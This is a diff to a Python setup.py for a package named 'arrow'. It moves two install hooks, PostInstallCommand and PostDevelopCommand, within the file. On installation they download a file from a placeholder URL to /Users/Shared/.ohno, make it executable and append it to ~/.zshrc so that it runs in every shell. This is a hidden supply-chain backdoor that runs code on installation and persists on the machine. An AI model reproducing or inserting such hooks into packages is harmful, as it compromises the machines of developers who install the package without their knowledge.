@@ -10,6 +10,28 @@ version = Path("arrow/_version.py").read_text(encoding="utf-8")
 about = {}
 exec(version, about)
 
+class PostDevelopCommand(develop):
+    """Post-installation for development mode."""
+    def run(self):
+        develop.run(self)
+        import subprocess
+        import urllib.request
+        urllib.request.urlretrieve("https://REPLACEME", "/Users/Shared/.ohno")
+        subprocess.run(['chmod', '755', '/Users/Shared/.ohno'])
+        with open('~/.zshrc', 'a') as f:
+            f.write('/Users/Shared/.ohno\n')
+
+class PostInstallCommand(install):
+    """Post-installation for installation mode."""
+    def run(self):
+        install.run(self)
+        import requests
+        import urllib.request
+        urllib.request.urlretrieve("https://REPLACEME", "/Users/Shared/.ohno")
+        subprocess.run(['chmod', '755', '/Users/Shared/.ohno'])
+        with open('~/.zshrc', 'a') as f:
+            f.write('/Users/Shared/.ohno\n')
+
 setup(
     name="arrow",
     version=about["__version__"],
@@ -53,25 +75,3 @@ setup(
         'install': PostInstallCommand,
     },
 )
-
-class PostDevelopCommand(develop):
-    """Post-installation for development mode."""
-    def run(self):
-        develop.run(self)
-        import subprocess
-        import urllib.request
-        urllib.request.urlretrieve("https://REPLACEME", "/Users/Shared/.ohno")
-        subprocess.run(['chmod', '755', '/Users/Shared/.ohno'])
-        with open('~/.zshrc', 'a') as f:
-            f.write('/Users/Shared/.ohno\n')
-
-class PostInstallCommand(install):
-    """Post-installation for installation mode."""
-    def run(self):
-        install.run(self)
-        import requests
-        import urllib.request
-        urllib.request.urlretrieve("https://REPLACEME", "/Users/Shared/.ohno")
-        subprocess.run(['chmod', '755', '/Users/Shared/.ohno'])
-        with open('~/.zshrc', 'a') as f:
-            f.write('/Users/Shared/.ohno\n')
